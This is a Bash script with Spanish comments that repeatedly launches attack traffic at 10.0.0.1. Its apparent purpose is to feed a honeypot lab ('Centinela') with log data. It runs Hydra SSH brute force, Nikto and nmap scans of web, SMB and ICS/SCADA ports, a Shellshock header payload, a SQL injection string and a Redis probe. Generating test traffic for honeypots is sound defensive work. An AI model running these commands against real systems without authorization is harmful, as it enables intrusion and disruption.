#!/bin/bash

TARGET="10.0.0.1"

echo "### Iniciando bombardeo contra Centinela ($TARGET) ###"
echo "Presiona [CTRL+C] para detener el ataque."

while true
do
    # 1. Ataque de Fuerza Bruta SSH (Registros masivos en Cowrie)
    echo "[+] Lanzando fuerza bruta SSH..."
    hydra -l root -p "123456" ssh://$TARGET -t 4 &>/dev/null &

    # 2. Escaneo de vulnerabilidades Web (Registros en Tanner y Snare)
    echo "[+] Escaneando vulnerabilidades web (Nikto)..."
    nikto -h http://$TARGET -Tuning 12345 -Display 1 &>/dev/null &

    # 3. Ruido de red y escaneo de puertos industriales (Dionaea y Conpot)
    echo "[+] Escaneando puertos ICS/SCADA y SMB..."
    nmap -sV -p 21,445,102,502,1883 $TARGET &>/dev/null &

    # 4. Inyección de comandos simulada (Suricata / IDS)
    echo "[+] Simulando inyección de exploits..."
    curl -A "() { :; }; /bin/eject" http://$TARGET/cgi-bin/test.cgi &>/dev/null &
    curl "http://$TARGET/index.php?id='OR'1'='1" &>/dev/null &

    # 5. Ataque Redis (Registros en Redis Honeypot)
    echo "[+] Intentando acceso a Redis..."
    echo "info" | nc -w 1 $TARGET 6379 &>/dev/null &

    echo "--- Ciclo completado. Esperando 5 segundos para el siguiente impacto ---"
    sleep 5
done